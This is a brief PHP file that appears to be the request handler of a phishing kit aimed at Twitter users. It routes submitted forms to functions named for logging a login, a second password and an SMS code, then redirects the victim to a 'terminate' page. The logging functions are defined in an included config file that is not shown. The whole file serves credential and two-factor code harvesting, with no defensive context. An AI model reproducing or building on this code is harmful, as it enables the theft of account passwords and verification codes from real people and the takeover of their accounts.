<?php include("Config.php"); ?>
<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

  if($_POST['action'] == "login"){
    LogTwitter();
  }elseif($_POST['action'] == "password2"){
    LogTwitterPassword2();
  }elseif($_POST['action'] == "sms"){
    LogTwitterSMS();
  }

  header("Location: terminate.php");
}else{ header("Location: index.php"); }
